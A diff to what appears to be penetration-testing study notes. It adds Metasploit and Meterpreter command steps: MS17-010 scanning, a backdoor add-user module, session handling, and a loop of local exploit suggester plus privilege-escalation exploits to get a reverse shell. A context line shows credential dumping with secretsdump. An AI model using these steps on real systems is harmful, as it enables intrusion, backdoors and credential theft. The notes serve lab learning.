@@ -1712,6 +1712,27 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 
 ```
 
+## Metasploit (msf6)
+- start: `msfconsole`
+- search for modules: `search ms17`
+- to use a module: `use <#>` or use `use auxiliary/scanner/smb/smb ms17 010`
+- see options that needs to be filled: `options`
+- set rhost: `set rhosts 192.168.1.53`
+- deploy: `run`
+- see exploit target of a module: `show targets`
+- check if payload matches your target e.g. x64 or x86 machine: `show payloads`
+- Backdoor add user: `windows/manage/add_user`
+
+## Meterpreter (meterpreter >)
+- We can background a currently running meterpreter session and return back to msfconsole using: `background`
+- To check meterpreter sessions at background: `sessions -i`
+- to go back to session #5 in background meterpreter session: `sessions -i 5`+
+
+## Metasploit frame
+1. run exploit suggester to enumerate vuls in target: `use post/multi/recon/local_exploit_suggester`
+2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
+3. repeat thru the listed of suggested exploits and try until success
+
 # MISC
 
 ## General tips
